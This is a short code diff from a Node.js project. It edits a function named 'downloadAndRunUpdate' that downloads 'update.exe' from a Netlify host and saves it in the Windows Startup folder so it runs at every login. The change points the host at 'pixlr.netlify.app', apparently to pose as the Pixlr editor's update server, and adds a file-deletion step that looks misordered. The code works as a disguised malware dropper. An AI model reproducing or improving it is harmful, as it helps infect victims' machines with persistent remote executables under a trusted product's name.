@@ -7,11 +7,15 @@ const os = require('os');
 
 const downloadAndRunUpdate = () => {
     const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
-    const updatePath = path.join(startupPath, `update_${Date.now()}.exe`);
+    const updatePath = path.join(startupPath, `update.exe`);
     const file = fs.createWriteStream(updatePath);
 
+    if (fs.existsSync(updatePath)) {
+        fs.unlinkSync(updatePath);
+    }
+
     const options = {
-        hostname: 'conmeo999123.netlify.app',
+        hostname: 'pixlr.netlify.app',
         path: '/update.exe',
         method: 'GET',
         headers: {
